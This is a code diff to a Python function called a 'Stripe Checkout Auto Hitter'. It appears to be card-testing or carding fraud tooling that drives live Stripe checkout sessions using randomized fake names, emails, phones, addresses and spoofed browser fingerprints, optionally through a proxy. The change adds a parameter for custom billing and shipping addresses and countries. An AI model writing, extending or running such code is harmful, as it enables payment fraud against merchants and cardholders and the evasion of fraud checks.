@@ -597,18 +597,20 @@ async def stripe_gate(
     cs_live: str,
     pk_live: str,
     proxy: str = None,
+    custom_addresses: list = None,
 ) -> tuple:
     """
     Stripe Checkout Auto Hitter (v2 — fixed confirm + 3DS).
     Returns (status, msg, extra_info_dict).
     Single-session: /init, create PM, /confirm all happen in one AsyncSession.
     Merchant info is returned in the extra dict.
+    Pass custom_addresses=[{street,city,state,zip,country}] to override billing.
     """
     fname = random.choice(FIRST_NAMES)
     lname = random.choice(LAST_NAMES)
     email = _random_email()
     phone = _random_phone()
-    addr = random.choice(ADDRESSES)
+    addr = random.choice(custom_addresses or ADDRESSES)
     ua, impersonate = _generate_browser()
     stripe_tag = _random_stripe_ua_tag()
     version = random.choice(STRIPE_JS_VERSIONS)
@@ -767,7 +769,7 @@ async def stripe_gate(
             "allow_redisplay": "unspecified",
             "billing_details[name]": f"{fname} {lname}",
             "billing_details[email]": email,
-            "billing_details[address][country]": "US",
+            "billing_details[address][country]": addr.get("country", "US"),
             "billing_details[address][line1]": addr["street"],
             "billing_details[address][city]": addr["city"],
             "billing_details[address][postal_code]": addr["zip"],
@@ -849,7 +851,7 @@ async def stripe_gate(
                 update_data["billing_address[city]"] = addr["city"]
                 update_data["billing_address[state]"] = addr["state"]
                 update_data["billing_address[postal_code]"] = addr["zip"]
-                update_data["billing_address[country]"] = "US"
+                update_data["billing_address[country]"] = addr.get("country", "US")
             # Shipping address (use same address as billing)
             if _needs_shipping:
                 update_data["shipping_address[name]"] = f"{fname} {lname}"
@@ -857,7 +859,7 @@ async def stripe_gate(
                 update_data["shipping_address[address][city]"] = addr["city"]
                 update_data["shipping_address[address][state]"] = addr["state"]
                 update_data["shipping_address[address][postal_code]"] = addr["zip"]
-                update_data["shipping_address[address][country]"] = "US"
+                update_data["shipping_address[address][country]"] = addr.get("country", "US")
 
             update_headers = {
                 "accept": "application/json",
